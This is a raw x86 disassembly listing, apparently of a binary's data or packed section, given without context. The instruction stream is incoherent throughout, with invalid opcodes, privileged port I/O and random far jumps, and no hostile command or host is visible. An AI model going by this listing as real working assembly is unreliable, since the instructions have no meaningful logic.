  409dd9:	sub    eax,DWORD PTR [edx-0x48]
  409ddc:	(bad)  
  409ddd:	push   edx
  409dde:	gs cdq 
  409de0:	cmp    edx,eax
  409de2:	or     al,0x56
  409de4:	push   ebx
  409de5:	mov    ecx,0x726338c2
  409dea:	inc    edx
  409deb:	hlt    
  409dec:	jl     0x409de3
  409dee:	or     al,0x91
  409df0:	(bad)  
  409df1:	shl    DWORD PTR ds:0x7d533b8d,1
  409df7:	leave  
  409df8:	sub    BYTE PTR [edx+0x23],0x78
  409dfc:	push   eax
  409dfd:	in     al,dx
  409dfe:	push   edi
  409dff:	inc    ecx
  409e00:	mov    ds:0x8191919e,al
  409e05:	retf   
  409e06:	mov    BYTE PTR [ebx-0x70],bl
  409e09:	cs test bh,cl
  409e0c:	imul   ebp,DWORD PTR [eax+0x3c44a8e3],0x0
  409e13:	sub    ecx,DWORD PTR [edi+0x78]
  409e16:	ja     0x409dd2
  409e18:	in     eax,dx
  409e19:	add    ebx,DWORD PTR [edi+0x51109a55]
  409e1f:	ret    
  409e20:	xor    BYTE PTR [ebx-0x32],bl
  409e23:	aad    0x3b
  409e25:	xchg   BYTE PTR [ecx-0xe77ca4d],al
  409e2b:	test   al,0xb4
  409e2d:	dec    eax
  409e2e:	xchg   esi,eax
  409e2f:	jmp    0xe18b:0x1598dea6
  409e36:	sbb    ebp,ebp
  409e38:	dec    edi
  409e39:	pushf  
  409e3a:	adc    eax,0x7acbb0d
  409e3f:	add    bl,BYTE PTR [edx+0x7a2b02c5]
  409e45:	mov    edi,0x3a3901e0
  409e4a:	adc    esi,ebp
  409e4c:	test   eax,0x5be2482c
  409e51:	add    al,0x64
  409e53:	ret    
  409e54:	jmp    0x409e72
  409e56:	fsubr  DWORD PTR [esp+eax*4+0x74546e44]
  409e5d:	inc    ebx
  409e5e:	mov    esp,edx
  409e60:	mov    eax,ds:0x855f0dd5
  409e65:	jg     0x409e25
  409e67:	mov    ds:0x4b4009c9,eax
  409e6c:	enter  0x715b,0x98
  409e70:	(bad)  
  409e71:	jnp    0x409ece
  409e73:	leave  
  409e74:	inc    esi
  409e75:	sbb    dh,BYTE PTR [esp+edx*2+0x22]
  409e79:	mov    ch,0xce
  409e7b:	outs   dx,BYTE PTR ds:[esi]
  409e7c:	xlat   BYTE PTR ds:[ebx]
  409e7d:	clc    
  409e7e:	pop    eax
  409e7f:	loopne 0x409e98
  409e81:	cmp    BYTE PTR [ecx-0x73],dl
  409e84:	or     eax,0xffffffca
  409e87:	pop    ebx
  409e88:	sub    eax,0xc64c5081
  409e8d:	int    0xcb
  409e8f:	test   eax,edx
  409e91:	xor    DWORD PTR [ebx+0x63],ebp
  409e94:	ror    dh,1
  409e96:	sbb    DWORD PTR [edi+0x6f9c5cf1],ecx
  409e9c:	je     0x409e81
  409e9e:	add    eax,0xb2b9d004
  409ea3:	sbb    eax,0x9c24a04e
  409ea8:	test   BYTE PTR [esi],bl
  409eaa:	mov    WORD PTR [ebx-0x312b775c],?
  409eb0:	test   BYTE PTR [ebx],dl
  409eb2:	xchg   esi,eax
  409eb3:	sbb    DWORD PTR [eax+0x48de2e7f],0xf567839e
  409ebd:	jne    0x409ee4
  409ebf:	mov    esi,0xa7f0b563
  409ec4:	jl     0x409f05
  409ec6:	xlat   BYTE PTR ds:[ebx]
  409ec7:	shr    DWORD PTR [edi-0x42],1
  409eca:	mov    ebp,0x53e07892
  409ecf:	mov    ebx,0x3aec9
  409ed4:	and    dh,BYTE PTR [ecx]
  409ed6:	push   edx
  409ed7:	or     eax,0xee9bfaa6
  409edc:	push   es
  409edd:	rol    BYTE PTR [ebx+esi*2-0x8d2ba11],1
  409ee4:	inc    eax
  409ee5:	or     dl,BYTE PTR [ebx-0x61]
  409ee8:	or     ecx,DWORD PTR [edi]
  409eea:	arpl   bp,di
  409eec:	in     al,dx
  409eed:	lods   al,BYTE PTR ds:[esi]
  409eee:	pop    ss
  409eef:	mov    bl,ch
  409ef1:	gs or  dl,dh
  409ef4:	sbb    DWORD PTR [edi],esp
  409ef6:	pop    ecx
  409ef7:	fsubrp st(0),st
  409ef9:	ret    
  409efa:	loop   0x409f56
  409efc:	adc    DWORD PTR [edi+esi*2],edx
  409eff:	push   esi
  409f00:	inc    esi
  409f01:	lock sahf 
  409f03:	cld    
  409f04:	out    0x2f,al
  409f06:	mov    esp,0x3b219c5d
  409f0b:	ror    BYTE PTR [ecx-0x1e],1
  409f0e:	mov    dl,BYTE PTR [esi+0x7d]
  409f11:	sbb    eax,0x8603411f
  409f16:	imul   esp,DWORD PTR [ebx+0x44090ef5],0x281bd275
  409f20:	ret    
  409f21:	mov    bh,0x3f
  409f23:	mov    bl,0xac
  409f25:	cmp    dh,BYTE PTR [ecx+ebp*1+0x2b]
  409f29:	stos   BYTE PTR es:[edi],al
  409f2a:	xchg   esi,eax
  409f2b:	mov    eax,0x132a42bd
  409f30:	out    dx,eax
  409f31:	mov    dl,0xf4
  409f33:	cli    
  409f34:	jbe    0x409edc
  409f36:	jb     0x409f04
  409f38:	into   
  409f39:	sub    al,0x96
  409f3b:	fsub   DWORD PTR [esp+eax*8]
  409f3e:	cdq    
  409f3f:	jo     0x409fac
  409f41:	jmp    0x1739:0x5e5896d4
  409f48:	int3   
  409f49:	ret    
  409f4a:	les    ebx,FWORD PTR [ebx+0x5f]
  409f4d:	lea    ebp,[ebx]
  409f4f:	mov    ebx,0xf297cb83
  409f54:	stc    
  409f55:	xor    DWORD PTR [edx+eiz*1+0x16],edx
  409f59:	push   eax
  409f5a:	popf   
  409f5b:	loop   0x409f9b
  409f5d:	scas   al,BYTE PTR es:[edi]
  409f5e:	outs   dx,DWORD PTR es:[esi]
  409f60:	sar    BYTE PTR [esp+ebp*2-0x43],0x4d
  409f65:	sahf   
  409f66:	inc    ebx
  409f67:	retf   0xe0c7
  409f6a:	mov    DWORD PTR [ebp+edx*2+0x7],edx
  409f6e:	std    
  409f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f70:	outs   dx,BYTE PTR ds:[esi]
  409f71:	inc    edi
  409f72:	bound  edi,QWORD PTR [edx]
  409f74:	xor    DWORD PTR ds:0xe7b6a91e,0xffffffa3
  409f7b:	mov    edi,DWORD PTR [ebx-0x7ae65ac6]
  409f81:	dec    ecx
  409f82:	cmp    eax,0x3766d5aa
  409f87:	pop    ss
  409f88:	cwde   
  409f89:	cdq    
  409f8a:	mov    ebp,0x76474572
  409f8f:	and    al,0xb5
  409f91:	push   cs
  409f92:	enter  0x621c,0xfe
  409f96:	xchg   DWORD PTR ds:0xf7ff1be4,ecx
  409f9c:	sub    al,0x52
  409f9e:	icebp  
  409f9f:	loope  0x409f88
  409fa1:	dec    esi
  409fa2:	and    bl,BYTE PTR [ecx]
  409fa4:	push   0x45
  409fa6:	mov    cl,0x32
  409fa8:	mov    ecx,0xa1765dfb
  409fad:	jle    0x409f4c
  409faf:	cmc    
  409fb0:	push   esi
  409fb1:	fs xchg esp,eax
  409fb3:	out    dx,al
  409fb4:	repnz jecxz 0x409fe6
  409fb7:	sub    DWORD PTR [ebp-0x14],esp
  409fba:	std    
  409fbb:	fsubr  QWORD PTR [esi-0x48]
  409fbe:	sbb    edi,DWORD PTR [ebx-0x7c7e1d0]
  409fc4:	xchg   BYTE PTR [esi-0x15],cl
  409fc7:	popa   
  409fc8:	cmp    edi,DWORD PTR [esi+0x7e]
  409fcb:	mov    ecx,0xe5748563
  409fd0:	sub    edi,DWORD PTR [esp+edi*4]
  409fd3:	jbe    0x409f7c
  409fd5:	(bad)  
  409fd6:	shr    DWORD PTR [ebp-0x5f2ab4b3],cl
  409fdc:	lock mov cl,0xc0
  409fdf:	mov    ds:0x4b9053e8,eax
  409fe4:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe6:	imul   ebx,DWORD PTR [ecx],0xc3e6cdbf
  409fec:	dec    ebp
  409fed:	gs inc esp
  409fef:	dec    DWORD PTR [esi]
  409ff1:	lea    eax,[ecx+0x9f24681]
  409ff7:	neg    BYTE PTR [eax-0x3b8bfa08]
  409ffd:	push   edi
  409ffe:	sub    al,0x47
  40a000:	mov    ecx,0x91d1bcbb
  40a005:	dec    ebx
  40a006:	ror    esp,cl
  40a008:	mov    esi,0x2434d03
  40a00d:	std    
  40a00e:	inc    edi
  40a00f:	cmc    
  40a010:	loope  0x409fb1
  40a012:	xor    al,0x69
  40a014:	push   edi
  40a015:	mov    esp,DWORD PTR [eax]
  40a017:	(bad)  
  40a018:	sbb    DWORD PTR [ecx+0x4f],ebp
  40a01b:	dec    esi
  40a01c:	cmp    eax,0x13c81525
  40a021:	pushf  
  40a022:	push   0x63fff0d8
  40a027:	fild   DWORD PTR [ebx+ecx*4-0x783bd4dc]
  40a02e:	inc    ebp
  40a02f:	aad    0x54
  40a031:	dec    ebx
  40a032:	lds    eax,FWORD PTR [edx-0x3486ccb0]
  40a038:	mov    bl,0x73
  40a03a:	cmp    BYTE PTR [ebx],dh
  40a03c:	js     0x40a081
  40a03e:	scas   eax,DWORD PTR es:[edi]
  40a03f:	stc    
  40a040:	sti    
  40a041:	loope  0x409fde
  40a043:	push   es
  40a044:	inc    ebx
  40a045:	pop    es
  40a046:	add    BYTE PTR [edx+0x50],ah
  40a049:	les    eax,FWORD PTR [edi-0x1d952338]
  40a04f:	mov    edx,0x89094e2
  40a054:	xchg   edi,eax
  40a055:	dec    ebx
  40a056:	push   cs
  40a057:	ja     0x40a09f
  40a059:	retf   0xf161
  40a05c:	out    0x39,al
  40a05e:	das    
  40a05f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a060:	inc    ecx
  40a061:	jo     0x409ff1
  40a063:	iret   
  40a064:	ja     0x40a0e4
  40a066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a067:	test   DWORD PTR [ebx+0x19],ecx
  40a06a:	dec    esi
  40a06b:	outs   dx,DWORD PTR ds:[esi]
  40a06c:	pop    ecx
  40a06d:	fdivr  DWORD PTR [edx]
  40a06f:	push   ss
  40a070:	leave  
  40a071:	bound  ebp,QWORD PTR [edx]
  40a073:	sti    
  40a074:	jne    0x40a065
  40a076:	iret   
  40a077:	xchg   ebx,eax
  40a078:	mov    ch,0x24
  40a07a:	inc    DWORD PTR [ebx]
  40a07c:	call   0x1ca8:0x4c1266bf
  40a083:	in     al,0x29
  40a085:	fist   DWORD PTR [eax-0x34c0684a]
  40a08b:	loopne 0x40a072
  40a08d:	jecxz  0x40a02b
  40a08f:	xchg   BYTE PTR [esp+eiz*4+0x1],bl
  40a093:	mov    ebx,0xc5f57a23
  40a098:	std    
  40a099:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a09b:	sahf   
  40a09c:	push   0x2848cf29
  40a0a1:	loop   0x40a0f1
  40a0a3:	mov    DWORD PTR [edi+esi*4-0x261de97b],edx
  40a0aa:	mov    esp,DWORD PTR [ebp+0x7626cf34]
  40a0b0:	mov    ds:0x9954ca08,eax
  40a0b5:	mov    ?,WORD PTR [eax-0x29a3002d]
  40a0bb:	(bad)  
  40a0bc:	cmp    al,0x0
  40a0be:	sar    DWORD PTR [esi+0x2d09176f],cl
  40a0c4:	fwait
  40a0c5:	push   0x6371a2b7
  40a0ca:	jae    0x40a112
  40a0cc:	retf   0xb208
  40a0cf:	test   al,0x60
  40a0d1:	rol    BYTE PTR [edi+0x6f46dcbc],0xbf
  40a0d8:	leave  
  40a0d9:	imul   eax,DWORD PTR [ebx+0x3f4dcef7],0x8f995bc7
  40a0e3:	fnsave [ebp-0x27]
  40a0e6:	xor    ch,bl
  40a0e8:	or     ebx,DWORD PTR [ebx+edx*4+0x7d072ad3]
  40a0ef:	sar    DWORD PTR [edx+0x58],1
  40a0f2:	pop    ecx
  40a0f3:	mov    esi,0xbd5a74ce
  40a0f8:	push   ss
  40a0f9:	cdq    
  40a0fa:	je     0x40a0b9
  40a0fc:	mov    cl,0xc2
  40a0fe:	pop    ebx
  40a0ff:	out    dx,eax
  40a100:	ror    DWORD PTR ds:0x3d1c5acd,cl
  40a106:	push   eax
  40a107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a108:	cld    
  40a109:	push   ss
  40a10a:	outs   dx,BYTE PTR ds:[esi]
  40a10b:	jae    0x40a0a5
  40a10d:	inc    esp
  40a10e:	or     al,0xb0
  40a110:	adc    BYTE PTR [ecx-0x46],al
  40a113:	stos   DWORD PTR es:[edi],eax
  40a114:	xlat   BYTE PTR ds:[ebx]
  40a115:	xor    al,0x9d
  40a117:	nop
  40a118:	in     eax,0x27
  40a11a:	int    0x9b
  40a11c:	fs push edi
  40a11e:	idiv   DWORD PTR [eax-0x1487079e]
  40a124:	push   ecx
  40a125:	jb     0x40a0ac
  40a127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a128:	clc    
  40a129:	xchg   ebp,eax
  40a12a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a12b:	pop    ebx
  40a12c:	(bad)  
  40a12d:	sub    eax,0x60e25145
  40a132:	retf   
  40a133:	int3   
  40a134:	adc    al,0x7
  40a136:	push   esp
  40a137:	xchg   esi,eax
  40a138:	adc    edi,DWORD PTR [ecx+0x4a9095a0]
  40a13e:	pusha  
  40a13f:	or     ecx,ebp
  40a141:	pop    ds
  40a142:	sub    DWORD PTR [ebp-0x4a],0xffffff95
  40a146:	pushf  
  40a147:	test   eax,0xce88dbdd
  40a14c:	les    ebx,FWORD PTR [ebp-0x51171645]
  40a152:	xchg   DWORD PTR [eax],edi
  40a154:	mov    dh,0x10
  40a156:	pop    ss
  40a157:	in     eax,0x4
  40a159:	stc    
  40a15a:	retf   0xd854
  40a15d:	pop    esp
  40a15e:	lock add BYTE PTR [ebp+0x6db41dc5],dh
  40a165:	adc    edx,ebp
  40a167:	push   es
  40a168:	push   cs
  40a169:	das    
  40a16a:	xchg   edx,eax
  40a16b:	imul   BYTE PTR [ecx-0x6f5a80d9]
  40a171:	out    dx,al
  40a172:	rcr    BYTE PTR ds:0xf581a0f7,cl
  40a178:	inc    esi
  40a179:	sbb    DWORD PTR [edi],edi
  40a17b:	outs   dx,DWORD PTR ds:[esi]
  40a17c:	push   edx
  40a17d:	jmp    0x40a1ee
  40a17f:	push   ecx
  40a180:	imul   esi,DWORD PTR [eax],0xfffffff9
  40a183:	or     ecx,DWORD PTR [eax+0x1f]
  40a186:	fsub   QWORD PTR [esi+0x4f]
  40a189:	jbe    0x40a174
  40a18b:	enter  0xc067,0x10
  40a18f:	ret    0xd3e8
  40a192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a193:	dec    edi
  40a194:	cmc    
  40a195:	inc    edi
  40a196:	mov    bh,0xd0
  40a198:	test   BYTE PTR [ecx],0xa4
  40a19b:	lods   al,BYTE PTR ds:[esi]
  40a19c:	mov    bh,0xfb
  40a19e:	pop    ebp
  40a19f:	in     eax,0x1c
  40a1a1:	cld    
  40a1a2:	and    eax,0xcc4cb91b
  40a1a7:	dec    ebp
  40a1a8:	xor    BYTE PTR [edi],cl
  40a1aa:	test   BYTE PTR [edi+eiz*4+0x458d0000],al
  40a1b1:	hlt    
  40a1b2:	jmp    0x40a6bd
  40a1b7:	ds aas 
  40a1b9:	enter  0xcd3f,0xcf
  40a1bd:	int    0x3d
  40a1bf:	xor    BYTE PTR [ecx+0x4f],al
  40a1c2:	pop    esp
  40a1c3:	aas    
  40a1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1c5:	enter  0xb3,0x86
  40a1c9:	js     0x40a243
  40a1cb:	push   0x7c
  40a1cd:	js     0x40a247
  40a1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1d0:	mov    bl,0xab
  40a1d2:	bound  esi,QWORD PTR [ecx+0x12]
  40a1d5:	ins    BYTE PTR es:[edi],dx
  40a1d6:	cwde   
  40a1d7:	push   esp
  40a1d8:	sub    al,bl
  40a1da:	pop    ebx
  40a1db:	mov    dh,0x76
  40a1dd:	sbb    dh,BYTE PTR [edx]
  40a1df:	sbb    BYTE PTR [ecx],0x79
  40a1e2:	push   edi
  40a1e3:	popf   
  40a1e4:	add    BYTE PTR [eax-0x2c],bl
  40a1e7:	inc    edx
  40a1e8:	and    dl,0xd
  40a1eb:	imul   ebx,DWORD PTR [edx-0x5b9794f9],0xffffffdd
  40a1f2:	dec    bl
  40a1f4:	call   0x384de812
  40a1f9:	sbb    al,0xe4
  40a1fb:	push   es
  40a1fc:	mov    esi,0x3ad4a548
  40a201:	mov    ch,0x75
  40a203:	pop    ebp
  40a204:	dec    ecx
  40a205:	aad    0xeb
  40a207:	in     al,0xe3
  40a209:	fs push ss
  40a20b:	int3   
  40a20c:	add    eax,0xe565f9b3
  40a211:	mov    cl,BYTE PTR [esi-0x17dab199]
  40a217:	mov    al,ds:0x4c728297
  40a21c:	sub    DWORD PTR [edi-0x4d],ebp
  40a21f:	adc    eax,0x41ed2f45
  40a224:	fbstp  TBYTE PTR [ecx]
  40a226:	jg     0x40a22c
  40a228:	les    ebx,FWORD PTR [ebx]
  40a22a:	cld    
  40a22b:	xchg   esp,eax
  40a22c:	push   0xd7799d79
  40a231:	cmp    dh,BYTE PTR [esi]
  40a233:	add    BYTE PTR [ebp+0xa1e8725],bh
  40a239:	retf   
  40a23a:	pop    ebx
  40a23b:	stc    
  40a23c:	dec    eax
  40a23d:	push   ss
  40a23e:	ret    0x4bb3
  40a241:	shl    BYTE PTR [eax],0x5a
  40a244:	mov    edi,0x10930e51
  40a249:	jmp    0x40a1f3
  40a24b:	fiadd  WORD PTR ds:0x1f34c0a1
  40a251:	js     0x40a1d3
  40a253:	retf   0xa86c
  40a256:	sahf   
  40a257:	std    
  40a258:	add    bl,BYTE PTR [edi]
  40a25a:	or     DWORD PTR [edx+0x1ba78727],esi
  40a260:	sbb    ah,bh
  40a262:	pop    edi
  40a263:	sbb    BYTE PTR [edx],0xc3
  40a266:	adc    eax,0xe7414df4
  40a26b:	jb     0x40a2c5
  40a26d:	popf   
  40a26e:	xchg   esp,eax
  40a26f:	in     eax,dx
  40a270:	loope  0x40a283
  40a272:	data16 sbb BYTE PTR [edi+0x4c],bl
  40a276:	and    DWORD PTR [edx],eax
  40a278:	test   DWORD PTR [edx],eax
  40a27a:	inc    esi
  40a27b:	lods   al,BYTE PTR ds:[esi]
  40a27c:	or     DWORD PTR [esi-0x28],ebx
  40a27f:	scas   al,BYTE PTR es:[edi]
  40a280:	fnsave [edx-0x4cc1ed38]
  40a286:	in     eax,dx
  40a287:	hlt    
  40a288:	mov    ebx,0x4daad601
  40a28d:	inc    edi
  40a28e:	push   esi
  40a28f:	fldpi  
  40a291:	and    dh,al
  40a293:	xor    ebp,ebp
  40a295:	in     al,0xd5
  40a297:	inc    ebx
  40a298:	pop    edx
  40a299:	mov    BYTE PTR [ebx-0x6d],bh
  40a29c:	or     cl,BYTE PTR [edi]
  40a29e:	sub    al,0xfc
  40a2a0:	retf   
  40a2a1:	call   0xd30d01d9
  40a2a6:	push   esi
  40a2a7:	and    bh,dl
  40a2a9:	dec    ebp
  40a2aa:	pop    ebp
  40a2ab:	sbb    eax,0xe6d1bfdf
  40a2b0:	jle    0x40a263
  40a2b2:	out    0xfc,al
  40a2b4:	pop    ebp
  40a2b5:	adc    ecx,DWORD PTR [ecx-0x3af76603]
  40a2bb:	mov    ebp,0x408dfbf4
  40a2c0:	mov    BYTE PTR [ebp+0x74],cl
  40a2c3:	cmovo  ebx,DWORD PTR [ebx+0x57]
  40a2c7:	out    dx,al
  40a2c8:	loope  0x40a2ef
  40a2ca:	mov    bh,0x25
  40a2cc:	jmp    0x45f4:0xf76ae242
  40a2d3:	scas   al,BYTE PTR es:[edi]
  40a2d4:	mov    cl,0x3
  40a2d7:	push   ebp
  40a2d8:	and    BYTE PTR fs:[ecx+0x50f1868d],cl
  40a2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e0:	inc    esp
  40a2e1:	sar    DWORD PTR [esp+ebx*2+0x16cfc390],0x9f
  40a2e9:	hlt    
  40a2ea:	jo     0x40a32c
  40a2ec:	stos   DWORD PTR es:[edi],eax
  40a2ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ee:	addr16 loop 0x40a309
  40a2f1:	(bad)  
  40a2f2:	call   0xbc11:0xeb1c6579
  40a2f9:	jle    0x40a2c8
  40a2fb:	mov    ah,0x4f
  40a2fd:	and    DWORD PTR [esi+edi*2],ebp
  40a300:	mov    ecx,0x25d8cd77
  40a305:	inc    ebp
  40a306:	cmp    edi,DWORD PTR [esi+edx*1]
  40a309:	dec    eax
  40a30a:	xchg   ebx,eax
  40a30b:	sub    edi,DWORD PTR [eax-0x4e]
  40a30e:	add    edx,DWORD PTR [edx-0x34]
  40a311:	retf   0x9193
  40a314:	out    dx,al
  40a315:	setnp  ch
  40a318:	sub    esi,DWORD PTR [edi-0x316a97b6]
  40a31e:	cmp    bl,BYTE PTR [ebx]
  40a320:	mov    dl,0xcd
  40a322:	mov    ds:0xbe12246f,eax
  40a327:	fstp   DWORD PTR [ebx]
  40a329:	mov    ecx,edi
  40a32b:	fpatan 
  40a32d:	popf   
  40a32e:	and    al,0x34
  40a330:	in     eax,dx
  40a331:	pop    ecx
  40a332:	jmp    0xed43:0x1a265b0b
  40a339:	inc    ebp
  40a33a:	imul   ebp,ebp,0x1d9259ef
  40a340:	cmp    edi,DWORD PTR [ecx-0x22]
  40a343:	pop    eax
  40a344:	aaa    
  40a345:	or     al,BYTE PTR [ebx+0x1e17117a]
  40a34b:	aas    
  40a34c:	shl    bl,cl
  40a34e:	or     al,0xd0
  40a350:	aaa    
  40a351:	stos   BYTE PTR es:[edi],al
  40a352:	ins    DWORD PTR es:[edi],dx
  40a353:	ja     0x40a328
  40a355:	dec    ebx
  40a356:	jae    0x40a315
  40a358:	adc    al,0xad
  40a35a:	inc    edx
  40a35b:	mov    dl,0x29
  40a35d:	push   cs
  40a35e:	ja     0x40a2ed
  40a360:	sbb    ebp,esp
  40a362:	sub    edx,DWORD PTR [ebx+edx*4-0x2ea1f378]
  40a369:	push   ds
  40a36a:	fcmove st,st(5)
  40a36c:	retf   
  40a36d:	(bad)  
  40a36e:	mov    esi,0x2697c704
  40a373:	xor    BYTE PTR [edx-0x743b50bc],0xd6
  40a37a:	bnd ret 0x9544
  40a37e:	cmp    BYTE PTR [ebx+0x5e626ff4],bl
  40a384:	(bad)  
  40a386:	(bad)  
  40a387:	outs   dx,BYTE PTR ds:[esi]
  40a388:	xor    dl,dl
  40a38a:	cmp    al,0xd6
  40a38c:	inc    eax
  40a38d:	add    DWORD PTR [edx],0x25f771b0
  40a393:	out    0x4b,al
  40a395:	pop    esi
  40a396:	nop
  40a397:	mov    ds:0x4f3d7452,eax
  40a39c:	data16 jnp 0x40a38c
  40a39f:	out    dx,eax
  40a3a0:	ror    ch,1
  40a3a2:	ficom  DWORD PTR [ebx+ebp*8+0x7561eb2b]
  40a3a9:	xchg   ebx,ecx
  40a3ab:	sti    
  40a3ac:	xor    ch,BYTE PTR [ebx-0x40]
  40a3af:	xchg   edx,eax
  40a3b0:	jge    0x40a353
  40a3b2:	pushf  
  40a3b3:	in     al,0x2a
  40a3b5:	mov    ah,0x7c
  40a3b7:	addr16 loop 0x40a3c5
  40a3ba:	into   
  40a3bb:	imul   ebx,ebx,0x912562cc
  40a3c1:	push   0x59
  40a3c3:	cmp    ch,dl
  40a3c5:	nop
  40a3c6:	std    
  40a3c7:	mov    eax,ds:0xe43ef6
  40a3cc:	xor    ebx,DWORD PTR [edx-0x735fadd2]
  40a3d2:	pop    esi
  40a3d3:	mov    WORD PTR [ebx+0x54],?
  40a3d6:	adc    esi,ecx
  40a3d8:	adc    al,0x17
  40a3da:	inc    eax
  40a3db:	jle    0x40a416
  40a3dd:	loope  0x40a3eb
  40a3df:	(bad)  
  40a3e0:	in     al,0x33
  40a3e2:	(bad)  
  40a3e3:	sbb    eax,0xee20101b
  40a3e8:	fs pop edi
  40a3ea:	repz daa 
  40a3ec:	xor    BYTE PTR [edi],al
  40a3ee:	push   DWORD PTR [ebp-0x49]
  40a3f1:	out    dx,al
  40a3f2:	ficomp WORD PTR [ecx+ebp*2]
  40a3f5:	pop    ebp
  40a3f6:	pop    edx
  40a3f7:	ror    DWORD PTR [edx+0x7527a597],1
  40a3fd:	js     0x40a426
  40a3ff:	jmp    0x679f7796
  40a404:	lods   eax,DWORD PTR ds:[esi]
  40a405:	gs or  al,0xc5
  40a408:	ss mov ebp,0x684534cf
  40a40e:	test   eax,0x5a1b478c
  40a413:	into   
  40a414:	ins    BYTE PTR es:[edi],dx
  40a415:	fnstsw ax
  40a417:	outs   dx,BYTE PTR ds:[esi]
  40a418:	cwde   
  40a419:	jb     0x40a482
  40a41b:	mov    edi,0xdf4369b3
  40a420:	(bad)  
  40a421:	sbb    al,BYTE PTR [esi-0x17]
  40a424:	xor    BYTE PTR [esi],dl
  40a426:	and    eax,DWORD PTR [eax-0x2b]
  40a429:	add    eax,0x51527e3b
  40a42e:	jb     0x40a44c
  40a430:	push   esi
  40a431:	(bad)  
  40a432:	cmp    ah,ch
  40a434:	push   ds
  40a435:	sub    al,0xf0
  40a437:	jp     0x40a3df
  40a439:	lods   eax,DWORD PTR ds:[esi]
  40a43a:	loop   0x40a4a7
  40a43c:	mov    esp,0xf3ed9716
  40a441:	in     eax,dx
  40a442:	and    eax,0x2e4ec2fe
  40a447:	or     edx,0x47
  40a44a:	cmp    al,0xb5
  40a44c:	sub    esp,DWORD PTR [edi-0x68]
  40a44f:	add    eax,0x91ef0ef4
  40a454:	lock into 
  40a456:	cld    
  40a457:	jnp    0x40a42d
  40a459:	fs inc ebx
  40a45b:	(bad)  
  40a45c:	cmp    bh,ch
  40a45e:	mov    esp,0x204c0880
  40a463:	xor    edi,edi
  40a465:	cld    
  40a466:	mov    al,0xe4
  40a468:	mov    al,ds:0x9a225294
  40a46d:	xchg   edi,eax
  40a46e:	call   0x3b83:0x2656f482
  40a475:	xor    eax,ebx
  40a477:	or     bl,BYTE PTR [ecx]
  40a479:	pop    eax
  40a47a:	fwait
  40a47b:	pop    ebx
  40a47c:	xor    DWORD PTR [eax-0x1e76aac5],0x4f457560
  40a486:	jecxz  0x40a458
  40a488:	or     ebx,edx
  40a48a:	mov    al,0x6
  40a48c:	push   eax
  40a48d:	shl    BYTE PTR [edi+0x76],0x5a
  40a491:	adc    esi,DWORD PTR [edi+0x2b]
  40a494:	push   esi
  40a495:	test   ch,0xe1
  40a498:	sbb    DWORD PTR [edi],ebp
  40a49a:	push   0x6b421f84
  40a49f:	pop    ss
  40a4a0:	mov    ebp,0xb47f9f7b
  40a4a5:	mov    ebp,DWORD PTR ds:0x4cdf9cf8
  40a4ab:	das    
  40a4ac:	sub    ebp,ebx
  40a4ae:	or     ebx,ebp
  40a4b0:	(bad)  
  40a4b1:	enter  0xadf2,0xe9
  40a4b5:	sahf   
  40a4b6:	(bad)  
  40a4b7:	cmp    al,0x1a
  40a4b9:	sbb    cl,ch
  40a4bb:	xchg   ebp,eax
  40a4bc:	mov    ch,0x5f
  40a4be:	cmp    bl,BYTE PTR [ebx+0x1c47e103]
  40a4c4:	mov    edx,0xde728928
  40a4c9:	sbb    al,0x3a
  40a4cb:	cmp    bl,dl
  40a4cd:	repz sahf 
  40a4cf:	mov    ebp,0x5c5a81cd
  40a4d4:	iret   
  40a4d5:	pop    ebp
  40a4d6:	into   
  40a4d7:	loope  0x40a514
  40a4d9:	arpl   WORD PTR [edi-0xa],cx
  40a4dc:	mov    ah,0xa2
  40a4de:	dec    BYTE PTR [ebp+0x56]
  40a4e1:	mov    bh,0x66
  40a4e3:	pop    eax
  40a4e4:	pop    ebx
  40a4e5:	retf   
  40a4e6:	mov    esp,0xbcb25d17
  40a4eb:	push   eax
  40a4ec:	mov    cl,0xe8
  40a4ee:	inc    ebx
  40a4ef:	cmp    dl,BYTE PTR [ebx]
  40a4f1:	mov    dh,0x53
  40a4f3:	test   al,0x6a
  40a4f5:	ja     0x40a4a4
  40a4f7:	sub    al,0xf8
  40a4f9:	sar    DWORD PTR [eax+esi*4-0x78],1
  40a4fd:	iret   
  40a4fe:	fnstsw WORD PTR [esi+0x7b711c6e]
  40a504:	pop    ebx
  40a505:	add    BYTE PTR [esi+edi*4-0x47bee0be],ah
  40a50c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a50d:	xor    eax,0x354abf0b
  40a512:	mov    edi,esp
  40a514:	push   ebx
  40a515:	aad    0x91
  40a517:	inc    esp
  40a518:	sub    eax,0xb72f3e73
  40a51d:	nop
  40a51e:	rol    BYTE PTR [edx+0x7aa5a76b],cl
  40a524:	sbb    ebp,edx
  40a526:	ret    
  40a527:	not    ch
  40a529:	jl     0x40a51d
  40a52b:	loopne 0x40a56f
  40a52d:	push   ecx
  40a52e:	stos   BYTE PTR es:[edi],al
  40a52f:	or     eax,0x7389a68a
  40a534:	nop
  40a535:	push   ds
  40a536:	int    0x7e
  40a538:	cld    
  40a539:	adc    eax,0xc6a82fb7
  40a53e:	sbb    cl,BYTE PTR [edi]
  40a540:	lahf   
  40a541:	iret   
  40a542:	cwde   
  40a543:	jp     0x40a5ae
  40a545:	retf   
  40a546:	fdiv   DWORD PTR [ecx+0x79]
  40a549:	imul   esi,DWORD PTR [edx],0xffffff86
  40a54c:	mov    ds:0x11e41332,al
  40a551:	cli    
  40a552:	sbb    BYTE PTR [ebx-0x69a8c660],cl
  40a558:	(bad)  [edx]
  40a55a:	test   DWORD PTR [eax],edi
  40a55c:	sub    DWORD PTR [edx],ecx
  40a55e:	retf   
